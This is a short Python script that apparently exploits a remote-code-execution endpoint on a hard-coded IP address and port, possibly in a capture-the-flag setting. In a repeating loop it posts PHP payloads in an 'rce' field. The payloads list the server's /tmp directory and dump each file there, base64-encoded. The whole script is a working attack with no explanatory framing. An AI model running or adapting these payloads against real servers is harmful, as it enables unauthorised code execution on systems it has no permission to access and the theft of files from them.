import requests
import time


while True:
    url = "http://54.177.207.109:23333/"
    x = {"rce":"var_dump(scandir('/tmp'));"}
    x = requests.post(url=url, data=x)
    rrr = x.text
    print(rrr)
    x = """
        $x=scandir('/tmp/');
        foreach ($x as $y){
            echo base64_encode(file_get_contents('/tmp/'.$y));
            echo '\n';
            echo '\n';
        }      
        """
    data = {"rce":x}
    x = requests.post(url=url, data=data)
    rrr = x.text
    print(rrr)
    time.sleep(5)
